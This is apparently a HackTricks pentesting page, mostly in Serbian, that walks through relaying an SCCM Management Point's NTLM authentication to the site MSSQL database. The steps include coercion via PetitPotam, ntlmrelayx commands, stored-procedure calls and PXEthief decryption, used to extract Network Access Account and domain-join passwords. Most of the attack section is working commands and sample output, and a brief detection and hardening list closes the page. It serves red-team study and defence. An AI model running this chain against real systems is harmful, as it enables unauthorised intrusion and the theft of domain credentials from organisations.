# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Prisiljavanjem **System Center Configuration Manager (SCCM) Management Point (MP)** da se autentifikuje preko SMB/RPC i **preusmeravanjem** tog NTLM korisničkog naloga na **bazu podataka sajta (MSSQL)** dobijate `smsdbrole_MP` / `smsdbrole_MPUserSvc` prava. Ove uloge vam omogućavaju da pozivate skup procedura koje izlažu **Operating System Deployment (OSD)** policy blobove (akreditivi za Network Access Account, varijable Task-Sequence, itd.). Blobovi su heksadecimalno kodirani/šifrovani, ali se mogu dekodirati i dešifrovati pomoću **PXEthief**, što daje plaintext tajne.

Visok nivo lanca:
1. Otkrijte MP & bazu podataka sajta ↦ neautentifikovani HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Pokrenite `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Prisilite MP koristeći **PetitPotam**, PrinterBug, DFSCoerce, itd.
4. Kroz SOCKS proxy povežite se sa `mssqlclient.py -windows-auth` kao preusmereni **<DOMAIN>\\<MP-host>$** nalog.
5. Izvršite:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ili `MP_GetPolicyBodyAfterAuthorization`)
6. Uklonite `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Tajne kao što su `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, itd. se obnavljaju bez dodirivanja PXE ili klijenata.

---

## 1. Enumerating unauthenticated MP endpoints
MP ISAPI ekstenzija **GetAuth.dll** izlaže nekoliko parametara koji ne zahtevaju autentifikaciju (osim ako je sajt samo PKI):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Vraća javni ključ sertifikata za potpisivanje sajta + GUID-ove *x86* / *x64* **All Unknown Computers** uređaja. |
| `MPLIST` | Lista svaki Management-Point u sajtu. |
| `SITESIGNCERT` | Vraća sertifikat za potpisivanje Primarnog Sajta (identifikuje server sajta bez LDAP). |

Zgrabite GUID-ove koji će delovati kao **clientID** za kasnije DB upite:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Prosledi MP račun mašine na MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Kada se primorač aktivira, trebali biste videti nešto poput:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifikujte OSD politike putem sačuvanih procedura
Povežite se preko SOCKS proxy-a (port 1080 po defaultu):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Pređite na **CM_<SiteCode>** DB (koristite 3-cifreni kod lokacije, npr. `CM_001`).

### 3.1  Pronađite GUID-ove nepoznatih računara (opciono)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lista dodeljenih politika
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Svaki red sadrži `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Fokusirajte se na politike:
* **NAAConfig**  – kredencijali za Network Access Account
* **TS_Sequence** – varijable Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – može sadržati račune za pokretanje

### 3.3  Preuzmite puni sadržaj
Ako već imate `PolicyID` i `PolicyVersion`, možete preskočiti zahtev za clientID koristeći:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> VAŽNO: U SSMS povećajte “Maksimalni broj preuzetih karaktera” (>65535) ili će blob biti skraćen.

---

## 4. Dekodirajte i dekriptujte blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Primer oporavljenih tajni:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevant SQL uloge i procedure
Upon relay, prijava je mapirana na:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ove uloge izlažu desetine EXEC dozvola, ključne koje se koriste u ovom napadu su:

| Stored Procedure | Svrha |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Lista politika primenjenih na `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Vraća kompletnu telo politike. |
| `MP_GetListOfMPsInSiteOSD` | Vraćeno putem `MPKEYINFORMATIONMEDIA` putanje. |

Možete pregledati punu listu sa:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Detekcija i Ojačavanje
1. **Pratite MP prijave** – bilo koji MP račun računara koji se prijavljuje sa IP adrese koja nije njegova domaćin ≈ relj.
2. Omogućite **Proširenu zaštitu za autentifikaciju (EPA)** na bazi podataka sajta (`PREVENT-14`).
3. Onemogućite neiskorišćeni NTLM, primenite SMB potpisivanje, ograničite RPC (
iste mere zaštite korišćene protiv `PetitPotam`/`PrinterBug`).
4. Ojačajte MP ↔ DB komunikaciju sa IPSec / mutual-TLS.

---

## Takođe pogledajte
* Osnovi NTLM relja:
{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL zloupotreba i post-ekspolatacija:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Reference
- [Želeo bih da razgovaram sa vašim menadžerom: Krađa tajni pomoću relja menadžment tačaka](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Menadžer pogrešnih konfiguracija – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
